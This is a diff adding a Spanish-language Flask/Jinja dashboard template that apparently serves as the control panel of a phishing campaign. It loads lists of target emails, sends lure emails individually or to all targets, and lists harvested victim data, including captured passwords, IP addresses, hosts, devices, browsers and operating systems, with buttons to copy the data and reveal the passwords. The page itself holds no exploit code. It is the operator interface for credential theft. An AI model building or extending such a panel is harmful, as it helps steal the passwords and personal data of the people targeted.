@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp,container-queries"></script>
+  <title>Dashboard</title>
+  <script>
+    // Tailwind Dark Mode configuration
+    tailwind.config = {
+      darkMode: 'class',
+    };
+  </script>
+</head>
+<body class="bg-gray-100 dark:bg-gray-900 dark:text-gray-100">
+  <div class="container mx-auto p-4">
+    <div class="flex justify-between items-center mb-4">
+      <h1 class="text-2xl font-bold">Dashboard</h1>
+      <div class="flex items-center">
+        <button id="toggle-dark-mode" class="bg-gray-800 text-white py-2 px-4 rounded hover:bg-gray-700 mr-2">Toggle Dark Mode</button>
+        <form action="/logout" method="GET">
+          <button type="submit" class="bg-red-500 text-white py-2 px-4 rounded hover:bg-red-700">Cerrar Sesión</button>
+        </form>
+      </div>
+    </div>
+
+    <!-- Formulario -->
+    <div class="mb-4">
+      <form action="/load_targets" method="POST" class="bg-white dark:bg-gray-800 p-4 rounded shadow-md">
+        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
+        <label for="emails" class="block text-sm font-medium text-gray-700 dark:text-gray-300">
+          Ingrese lista de correos (separados por coma):
+        </label>
+        <textarea
+          id="emails"
+          name="emails"
+          rows="4"
+          class="mt-1 block w-full p-2 border border-gray-300 dark:border-gray-600 rounded-md bg-white dark:bg-gray-700 text-gray-900 dark:text-gray-100"
+        ></textarea>
+        <button type="submit" class="mt-2 bg-blue-500 text-white py-2 px-4 rounded hover:bg-blue-700">Enviar</button>
+      </form>
+    </div>
+
+    <!-- Sección de estadísticas -->
+    <div class="mb-4">
+      <h2 class="text-xl font-bold mb-2">Estadísticas</h2>
+      <div class="bg-white dark:bg-gray-800 p-4 rounded shadow-md">
+        <p class="text-sm font-medium text-gray-700 dark:text-gray-300">Total de Usuarios Registrados: {{ stats.total_users }}</p>
+      </div>
+    </div>
+
+    <!-- Tabla de usuarios sin credenciales -->
+    <div class="mb-4">
+      <div class="flex justify-between items-center mb-4">
+        <h2 class="text-xl font-bold mb-2">Usuarios Objetivos</h2>
+        <form action="/send-emails" method="GET">
+          <button type="submit" class="bg-green-500 text-white py-2 px-4 rounded hover:bg-green-700">Enviar a Todos</button>
+        </form>
+      </div>
+      <div class="bg-white dark:bg-gray-800 p-4 rounded shadow-md overflow-x-auto">
+        <table class="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
+          <thead>
+            <tr>
+              <th class="px-6 py-3 bg-gray-50 dark:bg-gray-700 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">
+                Correo Electrónico
+              </th>
+              <th class="px-6 py-3 bg-gray-50 dark:bg-gray-700 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">
+                Estado
+              </th>
+              <th class="px-6 py-3 bg-gray-50 dark:bg-gray-700"></th>
+            </tr>
+          </thead>
+          <tbody class="bg-white dark:bg-gray-800 divide-y divide-gray-200 dark:divide-gray-700">
+            {% for user in users_without_credentials %}
+            <tr>
+              <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900 dark:text-gray-100">{{ user.email }}</td>
+              <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900 dark:text-gray-100">
+                {% if user.email == 'anonymous@example.com' %}
+                  Desconocido
+                {% else %}
+                  {{ user.status }}
+                {% endif %}
+              </td>
+              <td class="flex py-4 whitespace-nowrap text-right text-sm font-medium">
+                <form action="/send-email/{{ user.id }}" method="POST" class="inline">
+                  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
+                  <button type="submit" class="{% if user.email == 'anonymous@example.com' %}bg-gray-500 cursor-not-allowed{% else %}bg-blue-500 hover:bg-blue-700{% endif %} text-white py-2 px-4 rounded" 
+                          {% if user.email == 'anonymous@example.com' %}disabled{% endif %}>
+                    Enviar
+                  </button>
+                </form>
+                
+                <button data-id="{{ user.id }}" type="button" class="copy-button bg-green-500 hover:bg-green-700 text-white py-2 px-4 rounded ml-2">
+                  Copiar
+                </button>
+    
+                <form action="/delete_email" method="POST" class="inline ml-2">
+                  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
+                  <input type="hidden" name="email_id" value="{{ user.id }}" />
+                  <button type="submit" class="bg-red-500 text-white py-2 px-4 rounded hover:bg-red-700">Borrar</button>
+                </form>
+              </td>
+            </tr>
+            {% endfor %}
+          </tbody>            
+        </table>
+      </div>
+    </div>
+    
+
+    <div class="mb-4">
+      <div class="flex justify-between items-center mb-4">
+        <h2 class="text-xl font-bold mb-2">Usuarios Objetivos</h2>
+      </div>
+      <div class="bg-white dark:bg-gray-800 p-4 rounded shadow-md overflow-x-auto">
+        <table class="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
+          <thead>
+            <tr>
+              <th class="px-6 py-3 bg-gray-50 dark:bg-gray-700 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">
+                Correo Electrónico
+              </th>
+              <th class="px-6 py-3 bg-gray-50 dark:bg-gray-700 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">
+                Estado
+              </th>
+              <th class="px-6 py-3 bg-gray-50 dark:bg-gray-700 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">
+                Dispositivo
+              </th>
+              <th class="px-6 py-3 bg-gray-50 dark:bg-gray-700 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">
+                Navegador
+              </th>
+              <th class="px-6 py-3 bg-gray-50 dark:bg-gray-700 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">
+                Sistema Operativo
+              </th>
+              <th class="px-6 py-3 bg-gray-50 dark:bg-gray-700 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">
+                Host
+              </th>
+              <th class="px-6 py-3 bg-gray-50 dark:bg-gray-700 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">
+                IP
+              </th>
+              <th class="px-6 py-3 bg-gray-50 dark:bg-gray-700 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">
+                Contraseña
+              </th>
+              <th class="px-6 py-3 bg-gray-50 dark:bg-gray-700"></th>
+            </tr>
+          </thead>
+          <tbody class="bg-white dark:bg-gray-800 divide-y divide-gray-200 dark:divide-gray-700">
+            {% for user in users_with_credentials %}
+            <tr>
+              <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900 dark:text-gray-100">{{ user.email }}</td>
+              <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900 dark:text-gray-100">
+                {% if user.email == 'anonymous@example.com' %}
+                  Desconocido
+                {% else %}
+                  {{ user.status }}
+                {% endif %}
+              </td>
+              <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-gray-100">{{ user.device }}</td>
+              <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-gray-100">{{ user.browser }} {{ user.browser_version }}</td>
+              <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-gray-100">{{ user.os }} {{ user.os_version }}</td>
+              <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-gray-100">
+                <input type="password" value="{{ user.user_host }}" class="sensitive-input bg-gray-100 p-1 rounded border border-gray-300 dark:bg-gray-700 dark:border-gray-600 dark:text-gray-100" readonly />
+              </td>
+              <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-gray-100">
+                <input type="password" value="{{ user.user_ip }}" class="sensitive-input bg-gray-100 p-1 rounded border border-gray-300 dark:bg-gray-700 dark:border-gray-600 dark:text-gray-100" readonly />
+              </td>
+              <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-gray-100">
+                <input type="password" value="{{ user.password }}" class="sensitive-input bg-gray-100 p-1 rounded border border-gray-300 dark:bg-gray-700 dark:border-gray-600 dark:text-gray-100" readonly />
+              </td>
+              <td class="flex justify-center items-center py-4 whitespace-nowrap text-right text-sm font-medium">                
+                <button data-id="{{ user.id }}" type="button" class="copy-button bg-blue-500 hover:bg-blue-700 text-white py-2 px-4 rounded ml-2">
+                  Copiar
+                </button>
+    
+                <form action="/delete_email" method="POST" class="inline ml-2">
+                  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
+                  <input type="hidden" name="email_id" value="{{ user.id }}" />
+                  <button type="submit" class="bg-red-500 text-white py-2 px-4 rounded hover:bg-red-700">Borrar</button>
+                </form>
+                
+                <label class="ml-2 text-gray-500 dark:text-gray-300">
+                  <input type="checkbox" class="show-password-checkbox"> Mostrar
+                </label>
+              </td>
+            </tr>
+            {% endfor %}
+          </tbody>            
+        </table>
+      </div>
+    </div>
+
+
+  <script src="{{ url_for('static', filename='dashboard.js') }}"></script>
+</body>
+</html>
